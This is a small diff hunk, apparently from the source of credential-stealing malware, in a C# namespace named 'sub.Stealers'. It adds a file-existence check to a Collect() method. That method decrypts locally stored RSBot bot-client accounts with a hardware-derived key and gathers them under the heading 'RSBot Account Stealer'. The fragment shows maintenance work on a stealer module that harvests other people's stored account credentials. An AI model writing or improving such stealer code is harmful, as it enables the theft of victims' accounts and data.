@@ -35,6 +35,8 @@ namespace sub.Stealers
 
         public void Collect()
         {
+            if (!File.Exists(_settingsFile))
+                return;
             IEnumerable<RSBotAccount> accounts = GetLocalAccounts(HardwareInfo.GetLocalKey());
             Data += "RSBot Account Stealer\r\n\r\n";
             foreach (RSBotAccount acc in accounts)
